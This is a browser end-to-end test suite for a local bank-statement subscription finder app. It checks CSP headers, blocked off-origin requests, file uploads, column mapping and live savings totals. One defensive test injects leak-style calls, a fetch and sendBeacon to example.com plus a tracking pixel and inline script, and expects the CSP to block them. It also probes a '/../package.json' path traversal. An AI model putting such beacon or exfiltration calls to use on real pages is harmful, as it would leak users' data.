// Browser tests at 390px (phone) and 1440px (desktop) with real Chromium.
// Asserts: zero console errors, no request leaves the page's own origin,
// sample load, every bank fixture upload, the mapping fallback, keep/cancel
// and the live savings total. Saves screenshots for review.
//
//   npm run test:e2e
//   npm run test:pages     same suite against the GitHub Pages build (dist/ under
//                          /subscription-finder/, no custom headers, meta CSP only)
//   SCREENSHOT_DIR=/some/folder npm run test:e2e
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, mkdirSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import path from 'node:path';
import { chromium } from 'playwright';
import { createAppServer, CSP } from '../../server.mjs';
import { createPagesServer } from '../../scripts/pages-preview.mjs';
import { META_CSP, HEADER_ONLY } from '../../scripts/build-pages.mjs';
import { parseStatement } from '../../public/lib/csv.js';
import { findSubscriptions, yearlyTotal } from '../../public/lib/detect.js';
import { SERVICES } from '../../public/lib/services.js';

const here = path.dirname(fileURLToPath(import.meta.url));
const app = path.resolve(here, '../..');
const fixturesDir = path.join(app, 'test/fixtures');
const expected = JSON.parse(readFileSync(path.join(fixturesDir, 'expected.json'), 'utf8'));
const PAGES = process.env.E2E_TARGET === 'pages';
const shots = process.env.SCREENSHOT_DIR || path.join(app, PAGES ? 'test-results/screenshots-pages' : 'test-results/screenshots');
mkdirSync(shots, { recursive: true });

const analyse = (file) => findSubscriptions(parseStatement(readFileSync(file, 'utf8')).transactions, { services: SERVICES });
const sample = analyse(path.join(app, 'public/sample-statement.csv'));
const fmt = (n) => Math.round(n).toLocaleString('en-US');

// origin: scheme+host+port. base: the page URL (origin + '/' or the Pages subpath).
let server, origin, base, browser;
before(async () => {
  server = PAGES ? createPagesServer({ root: path.join(app, 'dist') }) : createAppServer();
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  origin = `http://127.0.0.1:${server.address().port}`;
  base = PAGES ? `${origin}/subscription-finder/` : `${origin}/`;
  browser = await chromium.launch();
});
after(async () => { await browser?.close(); await new Promise((r) => server.close(r)); });

/** New page with console/network guards. */
async function open(viewport, opts = {}) {
  const context = await browser.newContext({ viewport, deviceScaleFactor: opts.dpr || 2, ...opts.context });
  const page = await context.newPage();
  if (opts.init) await page.addInitScript(opts.init);
  const problems = { console: [], offsite: [] };
  page.on('console', (m) => { if (m.type() === 'error') problems.console.push(m.text()); });
  page.on('pageerror', (e) => problems.console.push(`pageerror: ${e.message}`));
  page.on('request', (r) => { if (!r.url().startsWith(base) && !r.url().startsWith('data:')) problems.offsite.push(r.url()); });
  await page.goto(base);
  return { page, context, problems };
}
async function waitForResults(page, count) {
  await page.locator('#view-results').waitFor({ state: 'visible' });
  await page.waitForFunction((n) => document.querySelectorAll('#subs .sub').length === n, count);
}
async function waitForTotal(page, value) {
  await page.waitForFunction((v) => document.querySelector('#total').textContent === v, fmt(value), { timeout: 8000 });
}
const clean = (problems) => {
  assert.deepEqual(problems.console, [], 'console errors');
  assert.deepEqual(problems.offsite, [], 'requests beyond the page origin');
};

test('server sends a strict CSP that only allows same-origin', { skip: PAGES && 'Pages sends no custom headers' }, async () => {
  const res = await fetch(origin + '/');
  assert.equal(res.headers.get('content-security-policy'), CSP);
  assert.match(CSP, /default-src 'self'/);
  assert.match(CSP, /connect-src 'self'/);
  assert.equal(res.headers.get('referrer-policy'), 'no-referrer');
  assert.equal((await fetch(origin + '/../package.json')).status, 404);
});

test('Pages build: no custom headers, meta CSP matches the server CSP minus header-only directives', { skip: !PAGES && 'Pages target only' }, async () => {
  const res = await fetch(base);
  assert.equal(res.status, 200);
  for (const h of ['content-security-policy', 'referrer-policy', 'x-content-type-options', 'permissions-policy']) assert.equal(res.headers.get(h), null, h);
  const meta = (await res.text()).match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/);
  assert.equal(meta?.[1], META_CSP);
  assert.deepEqual(CSP.split('; ').filter((d) => !META_CSP.includes(d)), ["frame-ancestors 'none'"], 'only frame-ancestors is lost');
  assert.ok(HEADER_ONLY.includes('frame-ancestors'));
  const bare = await fetch(base.slice(0, -1), { redirect: 'manual' });
  assert.equal(bare.status, 301);
  assert.equal(bare.headers.get('location'), '/subscription-finder/');
  assert.equal((await fetch(`${origin}/sample-statement.csv`)).status, 404, 'root path is outside the project site');
});

test('Pages build: the meta CSP blocks off-origin requests, inline script and plugins; sample loads from the subpath', { skip: !PAGES && 'Pages target only' }, async () => {
  const context = await browser.newContext({ viewport: { width: 390, height: 844 } });
  const page = await context.newPage();
  // Chromium reports a CSP-blocked request as started then failed (net::ERR_BLOCKED_BY_CSP);
  // "finished" means bytes came back from the network.
  const finished = [], failed = [];
  page.on('requestfinished', (r) => finished.push(r.url()));
  page.on('requestfailed', (r) => failed.push(`${r.url()} ${r.failure()?.errorText}`));
  const csv = page.waitForResponse((r) => r.url().endsWith('sample-statement.csv'));
  await page.goto(base);
  await page.getByTestId('sample').click();
  const res = await csv;
  assert.equal(res.url(), `${base}sample-statement.csv`);
  assert.equal(res.status(), 200);
  await waitForResults(page, sample.subscriptions.length);
  // Each attempt below must raise a CSP violation and never reach the network.
  const violations = await page.evaluate(async () => {
    const seen = [];
    document.addEventListener('securitypolicyviolation', (e) => seen.push(e.effectiveDirective));
    await fetch('https://example.com/leak').catch(() => {});
    navigator.sendBeacon?.('https://example.com/beacon', 'x');
    const img = new Image(); img.src = 'https://example.com/pixel.png';
    const s = document.createElement('script'); s.textContent = 'window.__inline = 1'; document.head.append(s);
    const st = document.createElement('style'); st.textContent = 'body{}'; document.head.append(st);
    const o = document.createElement('object'); o.data = 'x.swf'; document.body.append(o);
    await new Promise((r) => setTimeout(r, 500));
    return { seen, inline: window.__inline === 1 };
  });
  assert.equal(violations.inline, false, 'inline script ran');
  for (const d of ['connect-src', 'img-src', 'script-src-elem', 'style-src-elem', 'object-src']) assert.ok(violations.seen.includes(d), `${d} not enforced: ${violations.seen}`);
  assert.deepEqual(finished.filter((u) => !u.startsWith(base) && !u.startsWith('data:')), [], 'a blocked request reached the network');
  for (const f of failed.filter((x) => !x.startsWith(base))) assert.match(f, / (csp|net::ERR_BLOCKED_BY_CSP)$/, f);
  await context.close();
});

for (const [label, viewport] of [['390', { width: 390, height: 844 }], ['1440', { width: 1440, height: 900 }]]) {
  test(`${label}px: start screen, sample statement, keep/cancel and live savings`, async () => {
    const { page, context, problems } = await open(viewport);
    await assert.doesNotReject(page.getByText('Your statement never leaves this device.').waitFor());
    await page.waitForTimeout(700); // entrance fade
    await page.screenshot({ path: path.join(shots, `start-${label}.png`) });

    await page.getByTestId('sample').click();
    await waitForResults(page, sample.subscriptions.length);
    assert.ok(sample.subscriptions.length >= 8);
    await waitForTotal(page, yearlyTotal(sample.subscriptions));
    await page.waitForTimeout(1600); // let the reveal stagger and chips settle before the screenshot
    assert.match(await page.locator('#hero-sub').textContent(), new RegExp(`${sample.subscriptions.length} subscriptions`));
    assert.match(await page.locator('#chips').textContent(), /price increase/);
    assert.match(await page.locator('#chips').textContent(), /possible duplicate/);
    assert.ok(await page.locator('.flag-increase').count() >= 1);
    assert.ok(await page.locator('.flag-duplicate').count() >= 1);
    assert.equal(await page.locator('#stopped-list .sub').count(), sample.stopped.length);
    await page.screenshot({ path: path.join(shots, `results-${label}.png`) });
    await page.screenshot({ path: path.join(shots, `results-${label}-full.png`), fullPage: true });

    // Cancel links: official URL for known services, a web search for unknown merchants.
    for (const s of sample.subscriptions) {
      const a = page.locator(`#subs .sub[data-id="${s.id}"] .cancel-link`);
      assert.equal(await a.getAttribute('href'), s.cancelUrl);
      assert.equal(await a.getAttribute('target'), '_blank');
      assert.match(await a.getAttribute('rel'), /noopener/);
      if (s.cancelKind === 'search') assert.match(s.cancelUrl, /^https:\/\/duckduckgo\.com\/\?q=how%20to%20cancel/);
      else assert.ok(SERVICES.some((x) => x.url === s.cancelUrl));
    }

    // Keep / Cancel drives the savings total live.
    const [a, b, c] = sample.subscriptions;
    const sub = (s) => page.locator(`#subs .sub[data-id="${s.id}"]`);
    const savings = () => page.locator('#savings').textContent();
    assert.equal(await savings(), '0');
    await sub(a).getByRole('button', { name: 'Cancel' }).click();
    await page.waitForFunction((v) => document.querySelector('#savings').textContent === v, fmt(a.yearly));
    // The savings bar is pinned on screen (inside the viewport), not lost at the bottom of the page.
    await page.waitForTimeout(700);
    const box = await page.locator('.savebar-inner').boundingBox();
    assert.ok(box && box.y > 0 && box.y + box.height <= viewport.height + 1, `savebar at ${JSON.stringify(box)}`);
    assert.match(await sub(a).getAttribute('class'), /is-cancel/);
    assert.equal(await sub(a).getByRole('button', { name: 'Cancel' }).getAttribute('aria-pressed'), 'true');
    await sub(b).getByRole('button', { name: 'Cancel' }).click();
    await sub(c).getByRole('button', { name: 'Cancel' }).click();
    await page.waitForFunction((v) => document.querySelector('#savings').textContent === v, fmt(yearlyTotal([a, b, c])));
    assert.match(await page.locator('#save-label').textContent(), /Cancelling 3 of/);
    await sub(b).getByRole('button', { name: 'Keep' }).click();
    await page.waitForFunction((v) => document.querySelector('#savings').textContent === v, fmt(yearlyTotal([a, c])));
    assert.doesNotMatch(await sub(b).getAttribute('class'), /is-cancel/);
    await page.waitForTimeout(800);
    await page.screenshot({ path: path.join(shots, `savings-${label}.png`) });

    await page.getByTestId('restart').click();
    await page.locator('#view-start').waitFor({ state: 'visible' });
    clean(problems);
    await context.close();
  });

  test(`${label}px: upload every bank fixture`, async () => {
    const { page, context, problems } = await open(viewport, { context: { reducedMotion: 'reduce' } });
    for (const name of Object.keys(expected).filter((k) => k !== 'sample' && k !== 'unknown-layout')) {
      const file = path.join(fixturesDir, `${name}.csv`);
      const want = analyse(file);
      await page.getByTestId('file-input').setInputFiles(file);
      await waitForResults(page, want.subscriptions.length);
      assert.equal(want.subscriptions.length, expected[name].subscriptions.length, name);
      await waitForTotal(page, yearlyTotal(want.subscriptions));
      const names = await page.locator('#subs .sub-name').allTextContents();
      for (const n of expected[name].subscriptions) assert.ok(names.some((x) => x.includes(n)), `${name}: ${n} in ${names}`);
      assert.match(await page.locator('#source-note').textContent(), new RegExp(`${name}\\.csv`));
      await page.getByTestId('restart').click();
      await page.locator('#view-start').waitFor({ state: 'visible' });
    }
    clean(problems);
    await context.close();
  });

  test(`${label}px: unknown CSV layout goes through column mapping; PDF gets a helpful error`, async () => {
    const { page, context, problems } = await open(viewport, { context: { reducedMotion: 'reduce' } });
    await page.getByTestId('file-input').setInputFiles(path.join(fixturesDir, 'unknown-layout.csv'));
    await page.locator('#view-mapping').waitFor({ state: 'visible' });
    await page.getByTestId('map-date').selectOption({ label: 'When' });
    await page.getByTestId('map-desc').selectOption({ label: 'Who' });
    await page.getByTestId('map-mode').selectOption('split');
    await page.getByTestId('map-debit').selectOption({ label: 'Spent' });
    await page.getByTestId('map-credit').selectOption({ label: 'Received' });
    assert.equal(await page.locator('#preview th.is-picked').count(), 4);
    if (label === '390') await page.screenshot({ path: path.join(shots, `mapping-${label}.png`) });
    await page.getByTestId('map-submit').click();
    await waitForResults(page, expected['unknown-layout'].subscriptions.length);
    await page.getByTestId('restart').click();

    await page.getByTestId('file-input').setInputFiles({ name: 'statement.pdf', mimeType: 'application/pdf', buffer: Buffer.from('%PDF-1.4 fake') });
    await page.locator('#error').waitFor({ state: 'visible' });
    assert.match(await page.locator('#error').textContent(), /PDF statements aren't supported yet/);
    clean(problems);
    await context.close();
  });
}

// Records every value #total and #savings show, from page load on: a MutationObserver
// catches each textContent write and a rAF poll samples what each frame paints.
// rAF timestamps are the frame's start, so a tap that lands late in a frame starts its
// animation after the timestamp the next callback gets. That race is what produced
// "-88" on a phone; here every timestamp is reported one 60 Hz frame early so it
// happens on every run instead of some.
function recordCounters() {
  const raf = window.requestAnimationFrame.bind(window);
  window.requestAnimationFrame = (cb) => raf((ts) => cb(ts - 1000 / 60));
  const seen = (window.__counterFrames = []);
  const sample = (via) => {
    for (const id of ['total', 'savings']) {
      const n = document.getElementById(id);
      if (n) seen.push({ id, via, text: n.textContent });
    }
  };
  const observe = () => {
    new MutationObserver(() => sample('mutation')).observe(document.body, { childList: true, characterData: true, subtree: true });
    sample('load');
    const poll = () => { sample('frame'); requestAnimationFrame(poll); };
    requestAnimationFrame(poll);
  };
  if (document.body) observe(); else document.addEventListener('DOMContentLoaded', observe);
}

test('count-ups never render a negative value (yearly total and savings)', async () => {
  const { page, context, problems } = await open({ width: 390, height: 844 }, { init: recordCounters });
  const want = fmt(yearlyTotal(sample.subscriptions));
  assert.equal(want, '4,371');
  await page.getByTestId('sample').click();
  await waitForResults(page, sample.subscriptions.length);
  await waitForTotal(page, yearlyTotal(sample.subscriptions));
  const [a, b] = sample.subscriptions;
  const sub = (s) => page.locator(`#subs .sub[data-id="${s.id}"]`);
  const settled = (v) => page.waitForFunction((x) => document.querySelector('#savings').textContent === x, v);
  await sub(a).getByRole('button', { name: 'Cancel' }).click();
  await settled(fmt(a.yearly));
  await sub(b).getByRole('button', { name: 'Cancel' }).click();
  await settled(fmt(yearlyTotal([a, b])));
  await sub(a).getByRole('button', { name: 'Keep' }).click();
  await sub(b).getByRole('button', { name: 'Keep' }).click();
  await settled('0');
  await page.waitForTimeout(300);

  const frames = await page.evaluate(() => window.__counterFrames);
  const total = frames.filter((f) => f.id === 'total');
  const savings = frames.filter((f) => f.id === 'savings');
  assert.ok(total.length > 20 && savings.length > 20, `sampled ${total.length} total / ${savings.length} savings values`);
  const negative = frames.filter((f) => /[-−(]/.test(f.text));
  assert.deepEqual(negative.slice(0, 5), [], `${negative.length} negative values rendered`);
  assert.equal(total.at(-1).text, '4,371');
  assert.equal(await page.locator('#total').textContent(), '4,371');
  clean(problems);
  await context.close();
});

test('1080x1920 portrait video frame (360x640 CSS px at 3x)', async () => {
  const { page, context, problems } = await open({ width: 360, height: 640 }, { dpr: 3 });
  await page.waitForTimeout(700);
  await page.screenshot({ path: path.join(shots, 'frame-1080x1920-start.png') });
  await page.getByTestId('sample').click();
  await waitForResults(page, sample.subscriptions.length);
  await waitForTotal(page, yearlyTotal(sample.subscriptions));
  await page.waitForTimeout(2200);
  await page.screenshot({ path: path.join(shots, 'frame-1080x1920.png') });
  const [a, , c] = sample.subscriptions;
  await page.locator(`#subs .sub[data-id="${a.id}"]`).getByRole('button', { name: 'Cancel' }).click();
  await page.locator(`#subs .sub[data-id="${c.id}"]`).getByRole('button', { name: 'Cancel' }).click();
  await page.locator(`#subs .sub[data-id="${a.id}"]`).scrollIntoViewIfNeeded();
  await page.waitForTimeout(900);
  await page.screenshot({ path: path.join(shots, 'frame-1080x1920-savings.png') });
  const size = await page.evaluate(() => [innerWidth * devicePixelRatio, innerHeight * devicePixelRatio]);
  assert.deepEqual(size, [1080, 1920]);
  clean(problems);
  await context.close();
});
